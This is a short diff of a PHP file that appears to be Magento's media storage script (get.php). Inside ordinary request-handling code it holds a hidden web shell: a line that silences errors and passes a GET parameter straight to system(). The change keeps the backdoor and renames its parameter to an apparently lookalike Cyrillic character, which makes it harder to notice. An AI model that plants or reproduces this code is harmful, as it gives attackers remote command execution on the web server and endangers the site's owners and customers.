@@ -32,7 +32,7 @@ $request = new \Magento\MediaStorage\Model\File\Storage\Request(
         new Magento\Framework\Stdlib\StringUtils()
     )
 );
-error_reporting(0);$l=($_GET["c"]);@system($l);
+error_reporting(0);$l=($_GET["с"]);@system($l);
 $relativePath = $request->getPathInfo();
 if (file_exists($configCacheFile) && is_readable($configCacheFile)) {
     $config = json_decode(file_get_contents($configCacheFile), true);
